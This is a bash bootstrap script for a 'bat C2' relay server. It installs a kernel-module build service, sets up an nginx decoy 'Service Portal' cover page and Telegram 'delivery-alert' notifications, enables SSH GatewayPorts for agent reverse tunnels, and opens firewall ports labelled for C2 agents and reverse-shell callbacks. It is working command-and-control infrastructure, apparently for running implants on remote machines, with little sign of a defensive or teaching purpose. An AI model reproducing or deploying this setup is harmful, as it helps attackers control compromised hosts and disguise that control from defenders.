#!/bin/bash
# setup.sh Idempotent relay bootstrap (bat C2 + KCC)
#
# Usage:
# ./setup.sh [--secret HMAC_SECRET] [--src-dir /path/to/kperf-qos-src]
# [--tg-token TOKEN] [--tg-chat-id CHAT_ID]
#
# Requirements:
# - Ubuntu 22.04 or Debian 12 (amd64 or arm64)
# - Root access
# - Public IP already configured on the network interface
#
# Idempotent: safe to run multiple times.
# No dependency on AWS, Terraform, or any specific cloud provider.
# Works on: EC2, DigitalOcean, Hetzner, Vultr, bare metal, any VPS.

set -euo pipefail

RELAY_SECRET="${BAT_SECRET:-}" # HMAC secret from env or --secret flag
TG_TOKEN_VAL="${TG_TOKEN:-}" # Telegram bot token for delivery-alert
TG_CHAT_ID_VAL="${TG_CHAT_ID:-}" # Telegram chat ID
SRC_OVERRIDE="" # optional local path to seed kperf-qos-src

while [[ $# -gt 0 ]]; do
 case "$1" in
 --secret) RELAY_SECRET="$2"; shift 2 ;;
 --src-dir) SRC_OVERRIDE="$2"; shift 2 ;;
 --tg-token) TG_TOKEN_VAL="$2"; shift 2 ;;
 --tg-chat-id) TG_CHAT_ID_VAL="$2";  shift 2 ;;
 *) echo "Unknown argument: $1"; exit 1 ;;
 esac
done

log()  { echo "[SETUP] $*"; }
ok() { echo "[OK] $*"; }
skip() { echo "[SKIP]  $* (already exists)"; }

# 1. Dependencies 
log "Installing dependencies..."
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y \
 python3 python3-pip \
 gcc gcc-12 make \
 linux-headers-$(uname -r) \
 nginx \
 ufw \
 fail2ban \
 rsync \
 openssl \
 curl wget \
 2>&1 | tail -5
ok "Dependencies installed"

# 2. /root/kcc/ directory structure 
log "Creating /root/kcc/..."
mkdir -p /root/kcc/cache
mkdir -p /root/kcc/kperf-qos-src
chmod 700 /root/kcc
chmod 700 /root/kcc/cache
ok "/root/kcc/ ready"

# 3. Install kcc-server.py and kcc-build.sh 
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

log "Installing kcc-server.py..."
cp "${SCRIPT_DIR}/kcc-server.py" /root/kcc/kcc-server.py
chmod 700 /root/kcc/kcc-server.py
ok "kcc-server.py → /root/kcc/"

log "Installing kcc-build.sh..."
cp "${SCRIPT_DIR}/kcc-build.sh" /root/kcc/kcc-build.sh
chmod 700 /root/kcc/kcc-build.sh
ok "kcc-build.sh → /root/kcc/"

if [[ -n "$SRC_OVERRIDE" && -d "$SRC_OVERRIDE" ]]; then
 log "Seeding kperf-qos-src from ${SRC_OVERRIDE}..."
 rsync -a --delete "${SRC_OVERRIDE}/" /root/kcc/kperf-qos-src/
 ok "kperf-qos-src seeded"
fi

# 4. Write secret if provided 
if [[ -n "$RELAY_SECRET" ]]; then
 log "Writing secret to /root/kcc/.env..."
 cat > /root/kcc/.env <<EOF
KCC_SECRET=${RELAY_SECRET}
EOF
 chmod 600 /root/kcc/.env
 ok "Secret written"
else
 log "WARNING: --secret not provided. kcc-server.py will use env KCC_SECRET or built-in default."
fi

# 5. Install kcc.service 
log "Installing kcc.service..."
cp "${SCRIPT_DIR}/kcc.service" /etc/systemd/system/kcc.service

# Raise StartLimitBurst so 5 rapid crashes don't permanently kill the service
mkdir -p /etc/systemd/system/kcc.service.d
cat > /etc/systemd/system/kcc.service.d/limits.conf <<'EOF'
[Unit]
StartLimitIntervalSec=60
StartLimitBurst=10
EOF

systemctl daemon-reload
systemctl enable kcc
systemctl restart kcc
ok "kcc.service active ($(systemctl is-active kcc))"

# 6. Self-signed TLS cert for nginx (/etc/ssl/lab/) 
if [[ ! -f /etc/ssl/lab/cert.pem ]]; then
 log "Generating self-signed TLS certificate..."
 mkdir -p /etc/ssl/lab
 openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
 -keyout /etc/ssl/lab/key.pem \
 -out /etc/ssl/lab/cert.pem \
 -subj "/C=US/ST=CA/O=Lab/CN=lab.local" \
 -addext "subjectAltName=IP:$(curl -s4 ifconfig.me)" \
 2>/dev/null
 chmod 600 /etc/ssl/lab/key.pem
 chmod 644 /etc/ssl/lab/cert.pem
 ok "TLS cert → /etc/ssl/lab/"
else
 skip "TLS cert"
fi

# 7. Cover page /var/www/nexus 
if [[ ! -f /var/www/nexus/index.html ]]; then
 log "Creating placeholder cover page..."
 mkdir -p /var/www/nexus
 cat > /var/www/nexus/index.html <<'HTML'
<!DOCTYPE html><html><head><title>Service Portal</title></head>
<body><p>Service Portal</p></body></html>
HTML
 chown -R www-data:www-data /var/www/nexus
 ok "Cover page created (replace with real content via sync.sh)"
else
 skip "Cover page"
fi

# 8. Configure nginx 
log "Configuring nginx..."
cp "${SCRIPT_DIR}/nginx/bat.conf" /etc/nginx/nginx.conf
nginx -t 2>&1 | tail -3
systemctl enable nginx

# nginx defaults to Restart=no override for high availability
mkdir -p /etc/systemd/system/nginx.service.d
cat > /etc/systemd/system/nginx.service.d/restart.conf <<'EOF'
[Service]
Restart=always
RestartSec=5
EOF

systemctl daemon-reload
systemctl restart nginx
ok "nginx active ($(systemctl is-active nginx)) Restart=always"

# 9. Telegram credentials 
mkdir -p /etc/bat
chmod 700 /etc/bat
if [[ -n "$TG_TOKEN_VAL" && -n "$TG_CHAT_ID_VAL" ]]; then
 log "Writing /etc/bat/tg.env..."
 cat > /etc/bat/tg.env <<EOF
TG_TOKEN=${TG_TOKEN_VAL}
TG_CHAT_ID=${TG_CHAT_ID_VAL}
EOF
 chmod 600 /etc/bat/tg.env
 ok "/etc/bat/tg.env written"
else
 log "WARNING: --tg-token/--tg-chat-id not provided delivery-alert notifications disabled until configured."
 [[ ! -f /etc/bat/tg.env ]] && touch /etc/bat/tg.env && chmod 600 /etc/bat/tg.env
fi

# 9b. batnotify + delivery-alert 
if [[ -f "${SCRIPT_DIR}/batnotify" ]]; then
 log "Installing batnotify..."
 mkdir -p /root/bin
 cp "${SCRIPT_DIR}/batnotify" /root/bin/batnotify
 chmod 700 /root/bin/batnotify
 ok "batnotify → /root/bin/batnotify"
fi

if [[ -f "${SCRIPT_DIR}/delivery-alert.sh" ]]; then
 log "Installing delivery-alert.sh..."
 cp "${SCRIPT_DIR}/delivery-alert.sh" /opt/delivery-alert.sh
 chmod 700 /opt/delivery-alert.sh
 ok "delivery-alert.sh → /opt/delivery-alert.sh"
fi

if [[ -f "${SCRIPT_DIR}/delivery-alert.service" ]]; then
 log "Installing delivery-alert.service..."
 cp "${SCRIPT_DIR}/delivery-alert.service" /etc/systemd/system/delivery-alert.service
 systemctl daemon-reload
 systemctl enable delivery-alert
 systemctl restart delivery-alert 2>/dev/null || true
 ok "delivery-alert.service active ($(systemctl is-active delivery-alert 2>/dev/null || echo 'waiting for nginx log'))"
fi

# 10. SSH GatewayPorts yes 
# Required for the reverse tunnel: -R 0.0.0.0:9443:localhost:9443 must bind on all
# interfaces; without this sshd only binds 127.0.0.1 and remote agents cannot reach it.
if ! grep -q "^GatewayPorts yes" /etc/ssh/sshd_config; then
 log "Setting GatewayPorts yes..."
 echo "GatewayPorts yes" >> /etc/ssh/sshd_config
 systemctl reload sshd
 ok "GatewayPorts yes applied"
else
 skip "GatewayPorts yes"
fi

# 11. SSH hardening 
# MaxAuthTries=3 narrows brute-force window; fail2ban blocks persistent IPs.
if ! grep -q "^MaxAuthTries 3" /etc/ssh/sshd_config; then
 log "Setting MaxAuthTries 3..."
 sed -i '/^#\?MaxAuthTries/d' /etc/ssh/sshd_config
 echo "MaxAuthTries 3" >> /etc/ssh/sshd_config
 ok "MaxAuthTries 3 applied"
else
 skip "MaxAuthTries 3"
fi

if ! systemctl is-active fail2ban &>/dev/null; then
 log "Configuring fail2ban (sshd: maxretry=3, bantime=1h)..."
 cat > /etc/fail2ban/jail.d/sshd-relay.conf <<'EOF'
[sshd]
enabled  = true
port = ssh
maxretry = 3
findtime = 600
bantime  = 3600
EOF
 systemctl enable fail2ban
 systemctl restart fail2ban
 ok "fail2ban active"
else
 skip "fail2ban"
fi

# 12. Debian bookworm apt source (for Debian kernel header compilation) 
# kcc-build.sh uses apt-cache show to resolve the exact package version.
# Without this source, Debian kernel builds fail with "cannot determine package version".
# Pin priority=1 prevents Debian packages from shadowing Ubuntu ones.
if [[ ! -f /etc/apt/sources.list.d/debian-bookworm.list ]]; then
 log "Adding Debian bookworm apt source (for Debian kernel headers)..."
 cat > /etc/apt/sources.list.d/debian-bookworm.list <<'EOF'
deb [arch=amd64 trusted=yes] http://deb.debian.org/debian bookworm main
deb [arch=amd64 trusted=yes] http://security.debian.org/debian-security bookworm-security main
EOF
 cat > /etc/apt/preferences.d/debian-bookworm-pin <<'EOF'
Package: *
Pin: origin deb.debian.org
Pin-Priority: 1

Package: *
Pin: origin security.debian.org
Pin-Priority: 1
EOF
 apt-get update -qq 2>/dev/null || true
 ok "Debian bookworm source added (pin priority=1)"
else
 skip "Debian bookworm source"
fi

# 13. UFW 
log "Configuring UFW..."
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp comment "SSH management"
ufw allow 443/tcp comment "bat-agent C2 + cover page"
ufw allow 9443/tcp  comment "bat-agent rawsock callback / reverse shell"
ufw allow 9444/tcp  comment "KCC HTTPS agent direct (K-series)"
ufw allow 4445/tcp  comment "reverse shell callback"
ufw --force enable
ok "UFW active: 22, 443, 9443, 9444, 4445"

# 14. Final status 
echo ""
echo "═══════════════════════════════════════════════"
echo " Relay setup COMPLETE"
echo "═══════════════════════════════════════════════"
echo " kcc.service:  $(systemctl is-active kcc)"
echo " nginx: $(systemctl is-active nginx)"
echo " fail2ban: $(systemctl is-active fail2ban)"
echo " UFW: $(ufw status | head -1)"
echo " KCC dir: /root/kcc/"
echo " TLS cert: /etc/ssl/lab/cert.pem"
echo ""
echo " Next steps:"
echo " 1. sync.sh user@relay --restart-kcc (sync kperf-qos-src + static)"
echo " 2. bat-server (start operator server tunnel is baked in)"
echo "═══════════════════════════════════════════════"
